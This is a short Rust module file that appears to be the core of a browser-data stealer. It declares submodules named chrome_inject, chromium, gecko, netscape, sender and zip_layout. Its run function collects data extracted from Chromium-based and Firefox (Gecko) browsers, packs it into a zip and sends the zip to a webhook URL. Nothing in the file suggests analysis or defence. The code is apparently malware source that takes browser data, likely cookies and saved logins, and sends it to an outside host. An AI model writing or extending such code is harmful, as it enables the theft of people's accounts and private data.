pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod netscape;
pub mod sender;
mod zip_layout;

pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut all_files: Vec<(String, String)> = Vec::new();

    all_files.extend(chromium::extract_all());
    all_files.extend(gecko::extract_all());

    zip_layout::sort_entries(&mut all_files);

    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    }

    Ok(())
}
